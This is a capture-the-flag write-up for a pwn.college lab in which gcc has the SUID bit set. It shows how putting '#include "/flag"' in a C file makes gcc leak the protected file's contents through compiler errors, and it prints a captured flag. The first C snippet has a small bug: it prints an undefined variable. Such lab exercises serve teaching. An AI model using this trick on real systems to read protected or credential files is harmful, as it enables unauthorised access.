`gcc` is GNU project `c` and `c++` compiler.

The problem is very interesting.

Our first approach is we will create a `c` program that will try to open the `flag` file and reads its content.

```bash
hacker@program-misuse-level-48:~$ /challenge/babysuid_level48 
Welcome to /challenge/babysuid_level48!

This challenge is part of a series of programs that
just straight up were not designed to let you read files.

I just set the SUID bit on /usr/bin/gcc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level48) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gcc!
hacker@program-misuse-level-48:~$ gcc /flag
/usr/bin/ld:/flag: file format not recognized; treating as linker script
/usr/bin/ld:/flag:1: syntax error
collect2: error: ld returned 1 exit status
hacker@program-misuse-level-48:~$ touch test.c
hacker@program-misuse-level-48:~$ nano test.c
hacker@program-misuse-level-48:~$ gcc test.c -o test
hacker@program-misuse-level-48:~$ ./test
Error opening file
```

```C
#include<stdio.h>

int main()
{
   FILE * fptr;
   fptr = fopen("/flag", "r");

  if(fptr == NULL)
  {
     printf("Error opening file");
     return 1;
  }
 char line[100];

 while(fgets(line, 100, fptr))
 {
     printf("%s", s);
 }

 fclose(fptr);
 return 0;

}
```

But it says it `Error opening file`. As expected. But we don't have the read permission of the `flag` file.

Is there any other way we can include the `flag` file?

Yes, that is `include` :)

If you `#include "/flag"` as a header file in the code or any other code like

```c
#include<stdio.h>
#include "/flag"

int main()
{
printf("Hello World\n");
return 0;
}
```

and then when we compile the code, it shows an error printing the content of the header file which is here the `flag` file.

```bash
hacker@program-misuse-level-48:~$ nano test.c
hacker@program-misuse-level-48:~$ gcc test.c -o test
In file included from test.c:2:
/flag:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘.’ token
    1 | pwn.college{cXZJeolVvSuOmI_pqojFXNoSOdb.0FM5EDL0AjNzQzW}
      |    ^
/flag:1:40: error: invalid suffix "FM5EDL0AjNzQzW" on floating constant
    1 | pwn.college{cXZJeolVvSuOmI_pqojFXNoSOdb.0FM5EDL0AjNzQzW}
```


